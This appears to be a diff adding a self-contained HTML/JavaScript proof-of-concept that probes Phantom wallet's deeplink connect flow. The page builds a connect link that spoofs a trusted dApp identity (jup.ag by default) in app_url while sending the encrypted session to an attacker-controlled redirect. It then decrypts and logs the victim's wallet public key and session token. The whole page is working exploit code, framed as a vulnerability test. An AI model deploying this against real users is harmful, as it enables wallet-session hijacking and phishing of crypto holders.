@@ -1,0 +1,117 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Phantom Deeplink Connect — Identity/Redirect Binding Probe</title>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tweetnacl/1.0.3/nacl.min.js"></script>
+<style>
+  :root{ --bg:#0a0a11; --fg:#eceef6; --mut:#8b94a7; --ln:#232433; --ac:#ab7cff; --ok:#38d39f; --bad:#ff5c7a; --warn:#ffcf5c; }
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--fg);font:15px/1.55 Inter,Segoe UI,Arial,sans-serif;padding:22px 16px;text-align:right;direction:ltr}
+  main{max-width:640px;margin-left:auto}
+  h1{font-size:18px;margin:0 0 2px} .sub{color:var(--mut);font-size:12px;margin:0 0 16px}
+  .card{border:1px solid var(--ln);border-radius:13px;background:#12131e;padding:16px;margin-bottom:14px}
+  label{display:block;color:var(--mut);font-size:12px;margin:8px 0 3px}
+  input,select{width:100%;background:#0b0c15;color:var(--fg);border:1px solid var(--ln);border-radius:8px;padding:9px 11px;font:12px Menlo,monospace;text-align:right}
+  a.go,button{display:block;width:100%;background:var(--ac);color:#140a24;border:0;border-radius:10px;padding:12px;font:700 14px Inter;text-decoration:none;text-align:center;cursor:pointer;margin-top:12px;word-break:break-all}
+  .verdict{border:1px solid var(--ln);border-radius:9px;padding:12px;font-weight:700;margin-top:10px}
+  .ok{color:var(--ok)} .bad{color:var(--bad)} .warn{color:var(--warn)} .ac{color:var(--ac)}
+  pre{background:#07080f;border:1px solid var(--ln);border-radius:8px;padding:11px;margin:10px 0 0;font:11px/1.5 Menlo,monospace;color:#cdd;white-space:pre-wrap;text-align:left;direction:ltr;max-height:300px;overflow:auto}
+  code{color:var(--ac);font-size:11px;word-break:break-all}
+</style>
+</head>
+<body>
+<main>
+  <h1>Phantom Deeplink — Identity ↔ Redirect Binding</h1>
+  <p class="sub">Implements Phantom's encrypted <code>ul/v1/connect</code> handshake (x25519 / nacl.box). Tests whether Phantom binds the identity it shows the user (<code>app_url</code>) to where the session is delivered (<code>redirect_link</code>). Use a burner.</p>
+
+  <div class="card">
+    <label>app_url — identity shown to the user (spoof a trusted dApp)</label>
+    <input id="appUrl" value="https://jup.ag" />
+    <label>redirect_link — where Phantom returns the encrypted session (attacker-controlled = THIS page)</label>
+    <input id="redirect" />
+    <label>cluster</label>
+    <input id="cluster" value="mainnet-beta" />
+    <a class="go" id="go">Build &amp; open Phantom connect</a>
+    <div class="verdict ac" id="verdict">Set app_url ≠ redirect origin, then connect in Phantom.</div>
+  </div>
+
+  <div class="card">
+    <div style="color:var(--mut);font-size:12px">Handshake log</div>
+    <pre id="log">loading tweetnacl…</pre>
+  </div>
+
+<script>
+'use strict';
+const $ = s => document.querySelector(s);
+const log = m => { const p=$('#log'); p.textContent = (p.textContent.startsWith('loading')?'':p.textContent+'\n') + m; };
+const KEY = 'ph_dapp_kp_v1';
+
+const ALPH='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz';
+function b58e(bytes){ let d=[0]; for(let i=0;i<bytes.length;i++){ let c=bytes[i]; for(let j=0;j<d.length;j++){ c+=d[j]<<8; d[j]=c%58; c=(c/58)|0; } while(c){ d.push(c%58); c=(c/58)|0; } }
+  let s=''; for(let k=0;bytes[k]===0&&k<bytes.length-1;k++) s+='1'; for(let q=d.length-1;q>=0;q--) s+=ALPH[d[q]]; return s; }
+function b58d(str){ let b=[0]; for(let i=0;i<str.length;i++){ let v=ALPH.indexOf(str[i]); if(v<0) throw Error('bad b58'); let c=v; for(let j=0;j<b.length;j++){ c+=b[j]*58; b[j]=c&0xff; c>>=8; } while(c){ b.push(c&0xff); c>>=8; } }
+  for(let k=0;str[k]==='1'&&k<str.length-1;k++) b.push(0); return new Uint8Array(b.reverse()); }
+
+function keypair(){
+  let kp;
+  try{ const s = sessionStorage.getItem(KEY); if(s){ const o=JSON.parse(s); kp={ publicKey:b58d(o.pk), secretKey:b58d(o.sk) }; } }catch{}
+  if(!kp){ kp = nacl.box.keyPair(); try{ sessionStorage.setItem(KEY, JSON.stringify({ pk:b58e(kp.publicKey), sk:b58e(kp.secretKey) })); }catch{} }
+  return kp;
+}
+
+function buildLink(){
+  const kp = keypair();
+  const appUrl = $('#appUrl').value.trim();
+  const redirect = $('#redirect').value.trim();
+  const cluster = $('#cluster').value.trim() || 'mainnet-beta';
+  const params = new URLSearchParams({
+    dapp_encryption_public_key: b58e(kp.publicKey),
+    cluster, app_url: appUrl, redirect_link: redirect
+  });
+  const link = 'https://phantom.app/ul/v1/connect?' + params.toString();
+  const sameOrigin = (()=>{ try{ return new URL(appUrl).origin === new URL(redirect).origin; }catch{ return false; } })();
+  $('#verdict').className = 'verdict ' + (sameOrigin ? 'ac' : 'warn');
+  $('#verdict').textContent = sameOrigin
+    ? 'app_url and redirect share origin (no spoof). Change app_url to a different, trusted dApp.'
+    : 'MISMATCH SET: identity=' + appUrl + '  →  session delivered to ' + (new URL(redirect).origin) + '. If Phantom shows "' + appUrl + '" and still returns a session here, that is identity/redirect hijack.';
+  return link;
+}
+
+function handleReturn(){
+  const q = new URLSearchParams(location.search);
+  if(q.get('errorCode')){ log('Phantom returned error: ' + q.get('errorCode') + ' ' + (q.get('errorMessage')||'')); return; }
+  const phantomPubB58 = q.get('phantom_encryption_public_key');
+  const nonceB58 = q.get('data') ? q.get('nonce') : null;
+  const dataB58 = q.get('data');
+  if(!phantomPubB58 || !dataB58 || !nonceB58) return;
+  log('— RETURN FROM PHANTOM —');
+  log('phantom_encryption_public_key: ' + phantomPubB58);
+  try{
+    const kp = keypair();
+    const shared = nacl.box.before(b58d(phantomPubB58), kp.secretKey);
+    const opened = nacl.box.open.after(b58d(dataB58), b58d(nonceB58), shared);
+    if(!opened){ log('DECRYPT FAILED (keypair mismatch / replay).'); return; }
+    const json = JSON.parse(new TextDecoder().decode(opened));
+    log('DECRYPTED session payload:\n' + JSON.stringify(json, null, 2));
+    const pub = json.public_key, sess = json.session;
+    $('#verdict').className = 'verdict bad';
+    $('#verdict').textContent = 'SESSION DELIVERED to this redirect origin. Wallet public_key=' + pub + '. If Phantom displayed app_url="' + ($('#appUrl').value.trim()) + '" (a different origin) during approval → identity/redirect hijack confirmed. Verify the identity Phantom showed.';
+    log('wallet public_key: ' + pub);
+    log('session token: ' + (sess ? sess.slice(0,24) + '…' : '(none)'));
+  }catch(e){ log('decrypt error: ' + e.message); }
+}
+
+addEventListener('load', () => {
+  if(typeof nacl === 'undefined'){ $('#log').textContent = 'tweetnacl failed to load (check network/CSP).'; return; }
+  if(!$('#redirect').value) $('#redirect').value = location.origin + location.pathname;
+  $('#log').textContent = 'ready. dapp_encryption_public_key = ' + b58e(keypair().publicKey);
+  $('#go').href = buildLink();
+  ['appUrl','redirect','cluster'].forEach(id => $('#'+id).oninput = () => { $('#go').href = buildLink(); });
+  handleReturn();
+});
+</script>
+</main>
+</body>
+</html>
